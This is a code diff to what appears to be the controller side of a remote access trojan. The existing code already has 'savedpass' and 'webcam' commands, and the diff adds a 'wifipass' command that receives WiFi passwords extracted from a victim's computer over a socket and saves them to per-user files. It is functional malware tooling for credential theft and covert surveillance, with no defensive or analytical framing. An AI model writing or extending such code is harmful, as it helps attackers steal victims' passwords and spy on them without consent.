@@ -193,6 +193,9 @@ def send_target_commands(conn):
                 elif cmd.startswith("savedpass"):
                     conn.send(str.encode(cmd))
                     savedpass(conn,cmd.split()[1])
+                elif cmd.startswith("wifipass"):
+                    conn.send(str.encode(cmd))
+                    wifipass(conn,cmd.split()[1])
                 elif cmd.startswith("webcam"):
                     conn.send(str.encode(cmd))
                     webcam(conn,cmd.split()[1])
@@ -435,6 +438,34 @@ def savedpass(conn,filename):
             with open(filename, 'rb') as file:
                 file_data = file.read()
             with open(f'{username}.txt','wb') as f:
+                f.write(file_data)
+    except Exception as e:
+        print('Error occurred while downloading the file:', str(e))
+
+"""
+    EXTRACT THE WIFI PASSWORDS FROM THE CLIENT'S COMPUTER
+"""
+
+
+def wifipass(conn,filename):
+    try:
+        print("Saving wifi passwords.....")
+        conn.send(str.encode(filename))
+        response = conn.recv(1024).decode()
+        if response == 'FileNotFound':
+            print('File not found on the remote server')
+        else:
+            username = conn.recv(1024).decode()
+            with open(filename, 'wb') as file:
+                while True:
+                    data = conn.recv(1024)
+                    if data == b'Done':
+                        print('Passwords Extracted Successfully')
+                        break
+                    file.write(data)
+            with open(filename, 'rb') as file:
+                file_data = file.read()
+            with open(f'{username}-wifi.txt','wb') as f:
                 f.write(file_data)
     except Exception as e:
         print('Error occurred while downloading the file:', str(e))
